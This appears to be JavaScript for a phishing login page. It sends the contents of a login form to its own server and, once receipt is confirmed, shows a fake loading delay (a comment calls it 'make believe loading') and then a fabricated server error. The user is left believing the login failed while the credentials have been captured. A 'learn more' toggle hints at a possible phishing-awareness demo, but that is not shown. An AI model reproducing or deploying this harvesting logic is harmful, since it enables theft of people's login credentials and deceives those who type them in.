function submitForm()   // Sends login data to server, once received, shows "server error message"
{
    var form = document.getElementById('loginForm');
    var formData = new FormData(form);

    fetch('/index',
    {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => 
    {
        if (data.includes("Login data received"))  
        {
            // delay added for make believe loading (randomly between 1 sec and 2.5 sec)
            var delay = Math.floor(Math.random() * 1000) + 1500; 
            setTimeout(showErrorMessage, delay);
        }
    })
}

function buttonLearnMore() 
{
    var learnMoreText = document.getElementById("learnMore");
    if (learnMoreText.style.display === "none" || learnMoreText.style.display === "") 
    {
        learnMoreText.style.display = "block";
    } 
    else 
    {
        learnMoreText.style.display = "none";
    }
}

function showErrorMessage() 
{
    var loginCard = document.querySelector('.login-card');
    var errorMessage = document.getElementById('serverError');

    Array.from(loginCard.children).forEach(child =>
    {
        if (child !== errorMessage) 
        {
            child.style.display = 'none';
        }
    });
    errorMessage.style.display = 'block';
}